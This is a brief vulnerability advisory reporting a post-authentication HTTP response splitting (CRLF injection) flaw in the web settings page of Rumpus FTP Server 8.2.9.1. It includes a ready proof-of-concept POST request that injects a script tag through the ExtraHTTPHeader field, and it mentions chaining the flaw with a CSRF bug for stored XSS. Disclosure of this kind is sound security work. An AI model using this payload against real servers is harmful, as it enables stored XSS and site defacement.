# Title: HTTP Response Splitting/CRLF Injection 
# Vendor: MAXUM Development (https://maxum.com)
# Affected Product: Rumpus FTP Web File Manager
# Tested On: Rumpus FTP Version 8.2.9.1 for Windows


#Description: A Post Authenticated HTTP Response Splitting vulnerability was identified in the Web Settings
Component of Web File Manager in Rumpus FTP Server 8.2.9.1


#Vulnerable Request:

POST /RAPR/WebSettingsGeneralSet.html HTTP/1.1
Host: 127.0.0.1
Cookie: UserAccount=xxxxxxx; SessionID=xx
Content-Type: application/x-www-form-urlencoded
Content-Length: xx

ExtraHTTPHeader=CRLF:test%0A%0A<script>alert(0)</script>

#Impact: To exploit this vulnerability an attacker can chain this with CSRF (CVE-2019-19664).
A successful exploit will result in stored XSS, website defacement etc.
